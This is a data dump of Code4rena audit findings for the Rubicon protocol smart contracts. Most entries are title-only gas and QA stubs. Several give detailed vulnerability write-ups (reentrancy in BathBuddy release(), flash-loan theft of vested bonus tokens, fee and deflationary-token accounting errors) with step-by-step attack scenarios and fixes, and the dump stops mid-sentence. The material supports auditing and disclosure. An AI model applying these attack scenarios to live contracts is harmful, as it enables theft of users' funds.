reentrancy in release() of BathBuddy.sol", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/283", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114   # Vulnerability details  ## Impact If a token with callback capabilities is used as a token to vested, then a malicious beneficiary may get the vested amount back without waiting for the vesting period.  ## Proof of Concept  In the function release, line (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87>), there\u2019s no modifier to stop reentrancy, in the other contracts it would be the synchronized modifier. If a token could reenter with a hook in a malicious contract (an ERC777 token, for example, which is backwards compatible with ERC20), released token counter array (<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116>) wouldn\u2019t be updated, enabling the withdrawal of the vested amount before the vesting period ends. A plausible scenario would be:  1) A malicious beneficiary contract B calls the release() function with itself as the recipient, everything goes according to the function, and transfer and callback to the malicious beneficiary contract happens.  2) Contract B contains tokensReceived(), a function in the ERC777 token that allows for callback to the victim contract as you can see here https://twitter.com/transmissions11/status/1496944873760428058/ (This function also can be any function that is analogous to a fallback function that might be implemented in a modified ERC20. As it can be seen, any token that would give the attacker control over the execution flow will suffice.)  3) Inside the tokensReceived() function, a call is made back to the release function.  5) This steps are repeated until vested amount is taken back.  4) This allows for the malicious beneficiary contract to redeem the vested amount while bypassing the vesting period, due to the released token counter array (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L116) which controls how many tokens are released (https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L101) being updated only after the transferring of all tokens occurs. As this is the case, malicious beneficiary  can get the usual amount that they could withdraw at the time indefinite amount of times (as result of released in line 101 will be 0), thus approximately getting all of their vested amount back without waiting for the vesting period. (fees not included).    There's also precedents of similar bugs that reported, as seen here: https://github.com/code-423n4/2022-01-behodler-findings/issues/154#issuecomment-1029448627   ## Tools used Manual code review, talks with dev  ## Recommended Mitigations Steps 1) Consider adding a mutex such as nonReentrant, or the synchronized modifier used in the other contracts.  2) Implement checks-effects-interactions pattern.  "}, {"title": "maxSellAllAmount and maxBuyAllAmount functions can be unintentionally paused (always revert).", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/282", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L290 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L307   # Vulnerability details  ## Impact The two functions maxSellAllAmount and maxBuyAllAmount will always revert in case at least (100-fee)\\% of user's balance can be matched with orders.    ## Proof of Concept Let say Bob placed an order selling 100 USDC with a low USDT price of 1:0.95.  Alice currently has 50 USDT and they want to maxSellAllAmount into USDC.   The function will pass 50 as amount into RubiconMarket's buyAll function where it fully matches with Bob's order. Here, the buy() function will first transfer alice's 50 USDT in and later 50 * feeBPS / BPS as fee. In this case, alice can not afford to pay.   Therefore, the two functions maxSellAllAmount and maxBuyAllAmount are useless in case user's request can be fully matched.  ## Recommended Mitigation Steps  Add the fee calculating before passing the amount to the RubiconMarket's buyAll, sellAll function.   ```solidity     /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxBuyAllAmount(         ERC20 buy_gem,         ERC20 pay_gem,         uint256 max_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender's entire balance in the trade                     uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));                  fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(             buy_gem,             maxAmount,             pay_gem,             max_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }      /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust     function maxSellAllAmount(         ERC20 pay_gem,         ERC20 buy_gem,         uint256 min_fill_amount     ) external returns (uint256 fill) {         //swaps msg.sender entire balance in the trade          uint256 maxAmount = _calcAmountAfterFee(ERC20(buy_gem).balanceOf(msg.sender));         fill = RubiconMarket(RubiconMarketAddress).sellAllAmount(             pay_gem,             maxAmount,             buy_gem,             min_fill_amount         );         ERC20(buy_gem).transfer(msg.sender, fill);     }       function _calcAmountAfterFee(uint256 amount) internal view returns (uint256) {         uint256 feeBPS = RubiconMarket(RubiconMarketAddress).getFeeBPS();         return amount.sub(amount.mul(feeBPS).div(10000));     } ```    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/281", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/279", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/278", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/277", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/269", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/268", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Core functionality not re-entrance safe - can result in stolen tokens or compromise the project usability.", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/266", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "Core functionality not re-entrance safe - can result in stolen tokens or compromise the project usability."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/263", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/262", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Deprecated variables may cause DoS", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Deprecated variables may cause DoS"}, {"title": "Admin rug vectors", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/249", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Admin rug vectors"}, {"title": "Lack of checks on expectedMarketFeeBPS.", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/240", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "Lack of checks on expectedMarketFeeBPS."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/235", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/234", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "startErUp() in RubiconRouter is callable by anyone which can cause DOS or griefing or fund loss if attacker calls it", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/230", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "startErUp() in RubiconRouter is callable by anyone which can cause DOS or griefing or fund loss if attacker calls it"}, {"title": "Outstanding Amount Of A Pool Reduced Although Tokens Are Not Repaid", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/221", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Outstanding Amount Of A Pool Reduced Although Tokens Are Not Repaid"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/220", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/219", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/218", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Missing checks allow strategists to steal all fund via `tailOff`", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/211", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Missing checks allow strategists to steal all fund via `tailOff`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/207", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/204", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/203", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/202", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/201", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/200", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/198", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/195", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/194", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/192", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "`BathBuddy`  contract's `vestedAmount` function includes fees leading to users being disproportionately rewarded after whale withdraws", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/191", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103-L104 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L133   # Vulnerability details   ## Impact  When a whale withdraws their tokens and receives rewards from the `BathBuddy` contract the fees they pay will erroneously become part of the calculation performed in function `vestedAmount`. This means that any subsequent withdrawer of funds may receive a disproportionate amount of tokens. The fees paid by a whale could still be much larger than the amount of tokens invested by a minnow.  Althought similar to the issue \"When `BathToken` contract is recipient of fees then users can make disproportionate returns after whales withdraw\" it is not the same issue since fees are always accrued in the `BathBuddy` contract and this cannot be changed. Also, the calculations in are subtly different  However, the outcome is the same. A minnow can receive a disproportionate reward and drain much of the fees from the contract.  The intention of setting the pool as the recipient of the fees was to reward HODLers but, in fact, they will be incentivised to withdraw after a whale does.  ## Proof of Concept  Consider the following scenario.  1. fee is set to 50 BPS (i.e. 0.50%) 2. A whale deposits 200 tokens 3. A minnow deposits 0.01 tokens 4. A `BathBuddy` contract is set up for the `BathToken` contract. 5. The whale withdraws their funds 6. The minnow then withdraws their funds  After step 5, the function `vestedAmount` will return a value that includes the fees paid by the whale. This is because the `BathBuddy` contract is the recipient of all fees. They are not transferred anywhere.  Thus, when the minnow withdraws their funds `releasable` is much larger than the amount they otherwise would have expected. Further [sharesWithdrawn](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L103) is equal to [initialTotalSupply](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L104) in this particular scenario so `mul(sharesWithdrawn).div(initialTotalSupply)` evaluates to `1`. This means that `amount = releaseable`.  A [test](https://github.com/sseefried/codearena-rubicon-2022-05/blob/f5010d845d3713b07a00f3bb96a5608c6d09b047/test/BugsBathBuddy.js#L55-L145) has been written in the private fork that exhibits this behaviour.  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Keep a tally of the fees accrued in a separate variable and work out a fairer system for distributing rewards to HODLers.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/187", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/186", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/184", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/183", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "admin can anytime change address to which withdrawal funds are sent.", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/177", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "admin can anytime change address to which withdrawal funds are sent."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/174", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/162", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/161", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/159", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/158", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Strategists can take more rewards than they should using the function strategistBootyClaim().", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/157", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/tree/main/contracts/rubiconPools/BathPair.sol#L591-L625   # Vulnerability details  ## Impact Strategists can take more rewards than they should using the function strategistBootyClaim(). Even though the owner trusts strategists fully I think it's recommended to remove such flaws. I think there would be 2 methods to claim more rewards.   ## Proof of Concept Method 1. A strategist can call the function using same asset/quote parameters. Then both of fillCountA and fillCountQ will be same positive values. The first code block for fillCountA(L597-L610) will work same as expected but the second block for fillCountQ(L611-L624) will be executed for the same asset again. Two mappings(totalFillsPerAsset, strategist2Fills) that save rewards will be updated for asset already after the first block  but totalFillsPerAsset and balance of this contract for quote would be still positive as there would be remaining rewards for other strategiets. So the strategist can get paid once more for the same asset.  Method 2. I think a reentrancy attack is possible also because two mappings are updated after transfer funds.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps For Method 1. You can add this require() at the beginning of function.(L595) require(asset != quote, \"asset = quote\");  For Method 2. You can update the state of 2 mappings before transfer. Move L608-L609 to L601 Move L622-L623 to L615  So final code will look like this.(pseudocode)  function strategistBootyClaim(address asset, address quote)     external     onlyApprovedStrategist(msg.sender) {     require(asset != quote, \"asset = quote\");      uint256 fillCountA = strategist2Fills[msg.sender][asset];     uint256 fillCountQ = strategist2Fills[msg.sender][quote];     if (fillCountA > 0) {         uint256 booty = (             fillCountA.mul(IERC20(asset).balanceOf(address(this)))         ).div(totalFillsPerAsset[asset]);          totalFillsPerAsset[asset] -= fillCountA;         strategist2Fills[msg.sender][asset] -= fillCountA;          IERC20(asset).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             asset,             booty,             block.timestamp         );     }     if (fillCountQ > 0) {         uint256 booty = (             fillCountQ.mul(IERC20(quote).balanceOf(address(this)))         ).div(totalFillsPerAsset[quote]);          totalFillsPerAsset[quote] -= fillCountQ;         strategist2Fills[msg.sender][quote] -= fillCountQ;          IERC20(quote).transfer(msg.sender, booty);         emit LogStrategistRewardClaim(             msg.sender,             quote,             booty,             block.timestamp         );     } }  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/153", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/152", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/150", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "previewWithdraw calculates shares wrongly", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/140", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L499   # Vulnerability details  The fee is wrongly accounted for in `previewWithdraw`.  ## Impact Function returns wrong result; Additionally, `withdraw(assets,to,from)` will always revert. (The user can still withdraw his assets via other functions).  ## Proof of Concept The `previewWithdraw` function returns *less* shares than the required assets (notice the substraction): ```             uint256 amountWithdrawn;             uint256 _fee = assets.mul(feeBPS).div(10000);             amountWithdrawn = assets.sub(_fee);             shares = convertToShares(amountWithdrawn); ``` This won't work, because if the user wants to receive amount of `assets`, he needs to burn *more* shares than that to account for the fee. Not less. This will also make `withdraw(assets,to,from)` [revert](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L514:#L519), because it takes the amount of shares from `previewWithdraw`, and then checks how much assets were really sent to the user, and verifies that it's at least how much he asked for: ```         uint256 expectedShares = previewWithdraw(assets);         uint256 assetsReceived = _withdraw(expectedShares, receiver);         require(assetsReceived >= assets, \"You cannot withdraw the amount of assets you expected\"); ``` But since the expectedShares is smaller than the original amount, and since `_withdraw` [deducts](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L604) the fee from expectedShares, then always `assets > assetsReceived`, and the function will revert.  ## Recommended Mitigation Steps The amount of shares that `previewWithdraw` should return is: `convertToShares(assets.add(assets.mul(feeBPS).div((10000.sub(feeBPS))))` I prove this mathematically in [this](https://i.ibb.co/hX41vzV/c4wd.jpg) image.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/131", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Cannot deposit to BathToken if token is Deflationary Token (BathHouse.sol)", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/126", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Cannot deposit to BathToken if token is Deflationary Token (BathHouse.sol)"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/121", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/120", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Strategists can't be removed", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/118", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264   # Vulnerability details  There is no option to revoke strategist's privilege. As the strategist is a very strategic role which can effectively steal LP's funds, this is very dangerous.  ## Impact A rogue / compromised / cancelled strategist can not be revoked of permissions.  ## Proof of Concept There's a function to [approve](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264) a strategist, but no option to revoke the access.  ## Recommended Mitigation Steps Add a function / change the function and allow setting strategist's access to false.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Inconsistent Order Book Accounting When Working With Transfer-On-Fee or Deflationary Tokens", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557   # Vulnerability details  ## Background  A transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount. For instance, a deflationary tokens might charge a certain fee for every transfer() or transferFrom()  Rubicon Finance supports the trading of any ERC20 token, and anyone can liquidity pool for a new token. Thus, it is possible that such a transfer-on-fee token or a deflationary/rebasing token be used in the protocol.  Based on the source code and comment of `BathToken._deposit()`, it appears that the team is aware of this issue, and proactively implemented control (before & after balance checks) to deal with deflationary tokens.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557)  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens      (totalSupply == 0) ? shares = assets : shares = (         assets.mul(totalSupply)     ).div(_pool);      // Send shares to designated target     _mint(receiver, shares);     ..SNIP.. } ```  However, such control was not consistently applied across the protocol, and might cause the internal accounting of the orderbook to be incorrect.  ## Proof-of-Concept  If the `pay_gem` token is an deflationary token, the `info.pay_amt` and the actual amount of `pay_gem` tokens received will not be in sync.   For instance, assume that  XYZ token is a deflation token that charges 10% fee for every transfer. If an `offer(100, XYZ, 100, DAI)` is executed, an order with 100 XYZ (pay) and 100 DAI (buy) will be added to the orderbook. However, the orderbook will only received 90 XYZ, thus only 90 XYZ is ecrowed in the orderbook. This discrepancy would break the internal accounting system of the order book.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392)  ```solidity /// @notice Key function to make a new offer. Takes funds from the caller into market escrow. function offer(     uint256 pay_amt,     ERC20 pay_gem,     uint256 buy_amt,     ERC20 buy_gem ) public virtual can_offer synchronized returns (uint256 id) {     ..SNIP..     OfferInfo memory info;     info.pay_amt = pay_amt;     info.pay_gem = pay_gem;     info.buy_amt = buy_amt;     info.buy_gem = buy_gem;     info.owner = msg.sender;     info.timestamp = uint64(block.timestamp);     id = _next_id();     offers[id] = info;      require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));     ..SNIP.. } ```  ## Impact  The internal accounting system of the order book would be inaccurate or break, affecting the protocol operation.  ## Recommended Mitigation Steps  In the `offer` function, get the actual received amount by calculating the difference of token balance before and after the transfer, and set the `info.pay_amt` to the actual received amount.  Alternatively, the team might want to consider implementing whitelisting mechanism so that deflationary tokens will not be supported if the risk of allowing permissionless creation of pool with arbitrary token deems to be significant. A DAO may be formed in the future to manage the whitelisting.  "}, {"title": "Lack of Access Control for offer(uint, ERC20, uint, ERC20) and insert(uint, unint)", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/110", "labels": ["bug", "help wanted", "2 (Med Risk)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "Lack of Access Control for offer(uint, ERC20, uint, ERC20) and insert(uint, unint)"}, {"title": "Attacker Could Steal Almost All The Bonus Token In BathBuddy Vesting Wallet", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/109", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool\u2019s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that an attacker could steal almost all the `bonusTokens` in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The root cause of this issue is that the amount of `bonusTokens` that a user is entitled to is based on their relative share of the pool\u2019s total vested bonus token at the point of the withdraw call. It is calculated based on the user's \"spot\" share in the pool. Thus, it is possible for an attacker to deposit large amount of tokens into a BathToken Pool to gain significant share of the pool (e.g. 95%), and then withdraw the all the shares immediately. The withdraw call will trigger the `BathToken.distributeBonusTokenRewards`, and since attacker holds overwhelming amount of share in the pool, they will receive almost all the `bonusToken` in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. This could be perform in an atomic transaction and attacker can leverage on flash-loan to fund this attack.  The following shows an example of this issue:  1. A sponsor sent 1000 DAI to the BathBuddy Vesting Wallet to be used as `bonusTokens` for bathWETH pool. The vesting duration is 4 weeks. 2. Alice and Bob deposited 50 WETH and 50 WETH respectively. The total underlying asset of bathWETH is 100 WETH after depositing. Each of them hold 50% of the shares in the pool. 3. Fast forward to the last hour of the vesting period, most of the `bonusToken` have been vested and ready for the recipients to claim. In this example, estimate 998 DAI are ready to be claimed at the final hour. 4. Since Alice has 50% stake in the pool, she should have accured close to 449 DAI at this point. If she decided to withdraw all her bathWETH LP tokens at this point, she would receive close to 449 DAI as `bonusTokens`. But she choose not to withdraw yet. 5. Unfortunately, an attacker performed a flash-loan to borrow 8500 WETH, and deposit large amount of WETH into the bathWETH gain significant share of the pool, and then withdraw the all the shares immediately. 6. Since attacker hold the an overwhelming amount of shares in the pool, they will receive almost all the `bonusToken` (around 997 DAI) in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. 7. At this point, Alice decided to withdraw all her bathWETH LP token. She only received dust amount of 0.7 DAI as `bonusTokens`  The following code shows that the amount of `bonusTokens` a user is entitled is based on the user's current share in the pool - `amount = releasable * 